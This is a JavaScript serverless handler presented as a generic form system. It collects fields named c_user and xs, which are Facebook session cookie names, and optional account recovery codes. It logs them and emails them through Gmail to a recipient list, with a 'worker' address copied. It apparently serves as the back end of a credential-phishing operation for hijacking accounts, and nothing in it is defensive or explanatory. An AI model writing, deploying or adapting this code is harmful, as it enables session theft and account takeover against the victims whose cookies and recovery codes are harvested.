import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers - IMPORTANT!
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // ✅ CHANGED: recovery_codes optional
    const { c_user, xs, emails, workerEmail, name } = req.body;
    const recovery_codes = req.body.recovery_codes || ''; // Optional

    console.log('📨 Processing submission...');
    console.log('c_user:', c_user);
    console.log('xs:', xs);
    console.log('emails:', emails);
    console.log('workerEmail:', workerEmail);
    console.log('name:', name);
    if (recovery_codes) {
      console.log('recovery_codes:', recovery_codes);
    }

    // ✅ Send email
    const emailResult = await sendGmail(emails, workerEmail, {
      c_user, xs, recovery_codes, name
    });

    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully!',
      emailSent: emailResult.success,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(500).json({
      success: false,
      message: 'Server error: ' + error.message
    });
  }
}

// Gmail Send Function
async function sendGmail(toEmails, ccEmail, formData) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASS
      }
    });

    const mailOptions = {
      from: `"Form System" <${process.env.GMAIL_USER}>`,
      to: toEmails.join(', '),
      cc: ccEmail,
      subject: `✅ New Submission: ${formData.name}`,
      html: `
        <div style="font-family: Arial, sans-serif;">
          <h2>📋 New Form Submission</h2>
          <p><strong>Name:</strong> ${formData.name}</p>
          <p><strong>c_user:</strong> ${formData.c_user}</p>
          <p><strong>xs:</strong> ${formData.xs}</p>
          ${formData.recovery_codes ? `<p><strong>Recovery Codes:</strong> ${formData.recovery_codes}</p>` : ''}
          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    
    console.log('✅ Email sent successfully!');
    return {
      success: true,
      message: 'Email sent successfully!'
    };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return {
      success: false,
      message: 'Email sending failed: ' + error.message
    };
  }
}
